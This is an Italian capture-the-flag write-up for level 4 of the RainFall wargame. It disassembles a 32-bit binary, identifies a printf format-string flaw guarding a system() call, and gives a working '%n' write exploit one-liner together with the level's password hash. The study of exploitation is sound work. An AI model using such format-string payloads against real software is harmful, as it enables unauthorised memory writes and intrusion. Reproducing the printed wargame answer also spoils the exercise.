# Level 4
Per prima cosa controlliamo le stringhe presenti nell'eseguibile:
```
level4@RainFall:~$ readelf -p '.rodata' level4

String dump of section '.rodata':
  [     8]  /bin/cat /home/user/level5/.pass
```
e ora passiamo a `gdb`:
```
level4@RainFall:~$ gdb -q level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) disass p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```
Sono presenti tre funzioni da dove analizzare: `main`, `n` e `p`.

### Funzione `main`
Chiama la funzione `n`

### Funzione `n`
Riserva 0x218 (536) byte nello stack e chiama le funzioni `fgets` e `p` nel
seguente modo:
```
fgets(s, 512, stdin);
p(s);
```
per poi controllare nella variabile globale posizionata all'indirizzo `0x8049810`
se contiene il numero 0x1025544 (16930116), se così fosse allora esegue:
```
system("/bin/cat /home/user/level5/.pass");
```
altrimenti termina la funzione.

### Funzione `p`
Chiama la funzione `printf` stampando la stringa che gli viene passata come
argomento.

### Soluzione
Dunque come nel livello precedente bisogna trovare l'offset dell'inizio della
stringa inserita in printf e poi stampare il numero di caratteri giusto per
passare all'esecuzione della funzione `system`:
```
python -c 'print ("\x10\x98\x04\x08" + "%16930112d%12$n")' | ./level4
```
Le uniche differenze rispetto all'exploit del livello precedente sono:
1. Uso `12$` così che `%n` prenda direttamente il dodicesimo argomento così evito di scrivere 11 `%x`
2. Uso `%16930112d` per stampare il restante numero di caratteri invece di scrivere 16930112 volte un qualsiasi carattere

### Output:
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```